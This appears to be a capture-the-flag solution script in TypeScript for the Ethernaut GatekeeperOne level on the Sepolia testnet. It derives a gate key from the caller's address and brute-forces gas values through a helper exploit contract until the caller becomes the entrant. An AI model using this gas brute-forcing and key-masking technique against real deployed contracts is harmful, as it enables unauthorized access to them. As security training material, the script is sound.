import { ethers } from "hardhat";

/**
 * Script to exploit GatekeeperOne using the AlternateExploit contract
 * This uses a completely different approach with assembly and direct gas control
 * 
 * Usage: 
 * EXPLOIT_ADDRESS=0xYourAlternateExploitAddress TARGET_ADDRESS=0xGatekeeperOneAddress npx hardhat run scripts/level-13-gatekeeper-1/alternate-exploit.ts --network sepolia
 */
async function main() {
  // Check required parameters
  if (!process.env.EXPLOIT_ADDRESS) {
    console.error("Error: AlternateExploit contract address not provided");
    console.error("Please set the EXPLOIT_ADDRESS environment variable");
    console.error("Example: EXPLOIT_ADDRESS=0xYourAddress npx hardhat run scripts/level-13-gatekeeper-1/alternate-exploit.ts --network sepolia");
    return;
  }

  if (!process.env.TARGET_ADDRESS) {
    console.error("Error: GatekeeperOne contract address not provided");
    console.error("Please set the TARGET_ADDRESS environment variable");
    console.error("Example: EXPLOIT_ADDRESS=0xYourAddress TARGET_ADDRESS=0xGatekeeperOneAddress npx hardhat run scripts/level-13-gatekeeper-1/alternate-exploit.ts --network sepolia");
    return;
  }

  const exploitAddress = process.env.EXPLOIT_ADDRESS;
  const targetAddress = process.env.TARGET_ADDRESS;

  console.log(`Using AlternateExploit contract at: ${exploitAddress}`);
  console.log(`Targeting GatekeeperOne contract at: ${targetAddress}`);

  // Get the signer
  const [deployer] = await ethers.getSigners();
  console.log(`Using signer address: ${deployer.address}`);

  // Connect to the AlternateExploit contract
  const AlternateExploit = await ethers.getContractFactory("AlternateExploit");
  const exploit = AlternateExploit.attach(exploitAddress);

  // Check if we're already the entrant
  console.log("Checking if we're already the entrant...");
  const isEntrantBefore = await exploit.checkIsEntrant(targetAddress, deployer.address);
  if (isEntrantBefore) {
    console.log("✅ You're already the entrant! No need to execute the exploit.");
    return;
  } else {
    console.log("We are not the entrant yet. Proceeding with the exploit...");
  }

  // Calculate the key (for informational purposes)
  const key = BigInt(Number(BigInt(deployer.address) & BigInt("0xFFFF"))) | BigInt("0x1000000000000000");
  const keyHex = "0x" + key.toString(16).padStart(16, '0');
  console.log(`Key to be used: ${keyHex}`);
  console.log(`Last 2 bytes of your address: 0x${deployer.address.slice(-4)}`);

  console.log("\n🔍 Starting AlternateExploit approach...");

  // Try different gas values
  // First, try with the batch approach
  console.log("Trying batch exploit with multiple gas values...");

  // Try multiple starting points to find the right gas value
  const startingPoints = [
    { start: 800000, step: 100, tries: 20 },
    { start: 80000, step: 100, tries: 20 },
    { start: 24000, step: 10, tries: 100 },
    { start: 81910, step: 1, tries: 50 }
  ];

  for (const { start, step, tries } of startingPoints) {
    console.log(`\nTrying batch with start=${start}, step=${step}, tries=${tries}...`);
    
    try {
      const tx = await exploit.batchExploit(targetAddress, start, step, tries);
      console.log(`Batch exploit transaction sent: ${tx.hash}`);
      
      console.log("Waiting for transaction to be mined...");
      await tx.wait();
      
      // Check if we succeeded
      const isEntrantAfterBatch = await exploit.checkIsEntrant(targetAddress, deployer.address);
      
      if (isEntrantAfterBatch) {
        console.log(`✅ Batch exploit succeeded! You are now the entrant.`);
        console.log(`Successful batch: start=${start}, step=${step}, tries=${tries}`);
        return;
      } else {
        console.log(`❌ Batch exploit failed. Moving to next batch...`);
      }
    } catch (error: any) {
      console.log(`Error with batch: ${error.message?.substring(0, 100) || 'Unknown error'}`);
    }
  }

  // If batches failed, try individual gas values
  console.log("\n🔄 Batch exploits failed. Trying individual gas values...");

  // List of specific gas values to try
  const gasValues = [
    81910, 81911, 81912, 81913, // Base value (8191 * 10) and variations
    81910 + 254, 81910 + 255, 81910 + 256, // Common offsets
    24400, 24500, 24600, 24700, 24800, 24900, 25000, // Common working values
    8191 * 3, 8191 * 3 + 255, 8191 * 3 + 256, // Different multiples
    114674, 114675, 114676, // (8191 * 14) + offset
    8191 // Just the modulus itself
  ];

  for (const gas of gasValues) {
    console.log(`\nTrying direct exploit with gas=${gas}...`);
    
    try {
      const tx = await exploit.exploit(targetAddress, gas);
      console.log(`Direct exploit transaction sent: ${tx.hash}`);
      
      console.log("Waiting for transaction to be mined...");
      await tx.wait();
      
      // Check if we succeeded
      const isEntrantAfter = await exploit.checkIsEntrant(targetAddress, deployer.address);
      
      if (isEntrantAfter) {
        console.log(`✅ Direct exploit succeeded with gas=${gas}! You are now the entrant.`);
        
        // Save the successful gas value
        try {
          const fs = require('fs');
          const path = require('path');
          const valuesFile = path.join(__dirname, 'successful-alt-gas.json');
          fs.writeFileSync(valuesFile, JSON.stringify({
            gasValue: gas,
            address: deployer.address,
            timestamp: new Date().toISOString()
          }, null, 2));
          console.log(`\n💾 Successful gas value saved to ${valuesFile}`);
        } catch (error) {
          // Ignore file save errors
        }
        
        return;
      } else {
        console.log(`❌ Direct exploit with gas=${gas} failed.`);
      }
    } catch (error: any) {
      console.log(`Error with gas=${gas}: ${error.message?.substring(0, 100) || 'Unknown error'}`);
    }
  }

  // Final check
  const finalCheck = await exploit.checkIsEntrant(targetAddress, deployer.address);
  if (finalCheck) {
    console.log("\n🎉 EXPLOIT SUCCESSFUL! You are now the entrant.");
  } else {
    console.log("\n❌ All exploit attempts failed. You are not the entrant.");
    console.log("\nTry these approaches:");
    console.log("1. Run the simple-exploit.ts script which uses a different methodology");
    console.log("2. Try on a local hardhat network which has more predictable gas behavior");
    console.log("3. Try manually calculating the exact gas using hardhat traces");
  }
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
